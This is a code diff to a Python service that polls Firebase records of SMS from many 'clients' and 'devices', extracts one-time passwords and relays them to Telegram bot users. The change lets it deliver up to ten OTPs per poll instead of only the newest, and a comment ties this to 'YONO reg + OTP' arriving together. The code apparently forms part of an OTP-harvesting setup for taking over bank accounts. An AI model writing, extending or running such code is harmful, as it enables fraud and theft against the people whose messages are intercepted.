@@ -32,7 +32,7 @@ def _otp_poll_timeout() -> float:
 
 MONITORING_START_SNAPSHOT_SEC = 4.0
 MAX_POLL_PATHS_FALLBACK = 8
-POLL_PROFILE_CONCURRENCY = 1
+POLL_PROFILE_CONCURRENCY = 12
 HOT_POLL_MAX_PATHS = 4
 SMS_PARENT_PATHS = ("clients", "client", "devices", "device", "users", "phones")
 SMS_CHILD_PATHS = (
@@ -101,7 +101,8 @@ TIME_FIELDS = (
     "receivedDate",
     "createdDate",
 )
-RECENT_MESSAGES_LIMIT = 2
+RECENT_MESSAGES_LIMIT = 15
+MAX_OTP_DELIVER_PER_POLL = 10
 _MESSAGES_DEVICE_PATH_RE = re.compile(r"^messages/[^/]+$")
 SEEN_META_KEY = "firebase_sms_seen"
 BASELINE_META_KEY = "firebase_sms_baseline"
@@ -1164,51 +1165,67 @@ async def _poll_messages_otp_only(
             )
         return 0
 
-    # One bot message per poll — newest OTP only (no bulk flood).
-    record = max(candidates, key=lambda item: _message_push_id(item) or 0)
-    push_id = _message_push_id(record)
-    sender = str(record.get("sender") or "Unknown")
-    body = str(record.get("message") or "")
-
+    # Deliver every new OTP in order (YONO reg + OTP often land within seconds).
     from app.firebase_sync import forward_incoming_to_mynum
 
-    inject_task = asyncio.create_task(
-        forward_incoming_to_mynum(db, profile, device, sender, body)
-    )
-    dm_task = asyncio.create_task(send_otp_received_dm(profile.telegram_user_id, sender, body))
-    try:
-        await inject_task
-    except Exception as exc:
-        logger.warning(
-            "OTP inject to /mynum failed device=%s sender=%s: %s",
-            device_id,
+    to_deliver = sorted(candidates, key=lambda item: _message_push_id(item) or 0)[
+        :MAX_OTP_DELIVER_PER_POLL
+    ]
+    delivered = 0
+    max_push_id = _messages_high_water(device)
+
+    for record in to_deliver:
+        push_id = _message_push_id(record)
+        if push_id is None:
+            continue
+        sender = str(record.get("sender") or "Unknown")
+        body = str(record.get("message") or "")
+
+        inject_task = asyncio.create_task(
+            forward_incoming_to_mynum(db, profile, device, sender, body)
+        )
+        dm_task = asyncio.create_task(send_otp_received_dm(profile.telegram_user_id, sender, body))
+        try:
+            await inject_task
+        except Exception as exc:
+            logger.warning(
+                "OTP inject to /mynum failed device=%s sender=%s: %s",
+                device_id,
+                sender,
+                exc,
+            )
+
+        ok = await dm_task
+        if not ok:
+            logger.error(
+                "OTP bot DM failed user=%s sender=%s id=%s",
+                profile.telegram_user_id,
+                sender,
+                push_id,
+            )
+            continue
+
+        save_sms(
+            db,
+            sender=sender,
+            message=body,
+            device_name=device.name,
+            received_at=record.get("received_at"),
+        )
+        mark_sms_keys_seen(device, {_record_dedup_key(record)})
+        max_push_id = max(max_push_id, int(push_id))
+        delivered += 1
+        logger.info(
+            "OTP delivered user=%s sender=%s push_id=%s",
+            profile.telegram_user_id,
             sender,
-            exc,
+            push_id,
         )
 
-    ok = await dm_task
-    if not ok:
-        logger.error("OTP bot DM failed user=%s sender=%s id=%s", profile.telegram_user_id, sender, push_id)
-        return 0
-
-    save_sms(
-        db,
-        sender=sender,
-        message=body,
-        device_name=device.name,
-        received_at=record.get("received_at"),
-    )
-    _bump_messages_high_water(device, int(push_id))
-    for skipped in candidates:
-        mark_sms_keys_seen(device, {_record_dedup_key(skipped)})
-    db.commit()
-    logger.info(
-        "OTP delivered to bot user=%s sender=%s push_id=%s (1 per poll)",
-        profile.telegram_user_id,
-        sender,
-        push_id,
-    )
-    return 1
+    if delivered:
+        _bump_messages_high_water(device, max_push_id)
+        db.commit()
+    return delivered
 
 
 async def _poll_one_monitoring_profile(profile_id: int) -> int:
